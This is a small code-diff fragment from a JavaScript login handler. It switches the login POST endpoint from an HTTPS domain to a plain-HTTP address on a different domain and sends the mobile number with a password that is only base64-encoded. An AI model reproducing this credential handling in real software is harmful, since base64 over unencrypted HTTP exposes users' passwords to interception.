@@ -48,7 +48,7 @@ loginSubmitBtn.addEventListener("click", function () {
     const pwd = btoa(password); 
 
     axios
-      .post("https://restore.msgqu.com/api/v1/login", {
+      .post("http://hg.v1k2.com/api/v1/login", {
         mobile: username,
         pwd,
       })
